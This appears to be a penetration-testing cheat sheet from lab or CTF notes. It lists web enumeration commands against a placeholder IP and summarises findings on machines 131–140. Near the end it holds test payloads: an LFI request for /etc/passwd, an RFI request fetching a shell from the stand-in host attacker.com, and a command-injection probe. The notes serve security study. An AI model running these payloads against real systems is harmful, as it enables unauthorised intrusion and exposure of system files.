## 🌐 Web Enumeration (Machines 131–140)

```bash
# Common Web Enumeration Tools and Techniques

# Use gobuster to discover hidden directories and files
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50

# Nikto scan for vulnerabilities in web servers
nikto -h http://<IP>

# Curl to inspect headers
curl -I http://<IP>

# Check for HTTP methods
curl -X OPTIONS http://<IP> -i

# Directory and file checks
curl http://<IP>/robots.txt
curl http://<IP>/.git/
curl http://<IP>/.svn/

# Check for Web Technologies
whatweb http://<IP>
wappalyzer http://<IP>

# Wordpress Enumeration
wpscan --url http://<IP> --enumerate u,vp,vt

# Joomla Enumeration
joomscan --url http://<IP>

# Drupal Enumeration
droopescan scan drupal -u http://<IP>

# Test for LFI
curl "http://<IP>/?page=../../../../etc/passwd"

# Test for RFI
curl "http://<IP>/?page=http://attacker.com/shell.txt"

# Command Injection
curl "http://<IP>/?cmd=;id"
```

### Observations from Machines 131–140

- Several machines had `/admin`, `/uploads`, or `.git/` directories exposed.
- CMS platforms like WordPress and Joomla were identified frequently.
- LFI vulnerabilities were found in dynamic parameters like `?page=`.
- Nikto and WhatWeb revealed outdated server versions prone to known exploits.
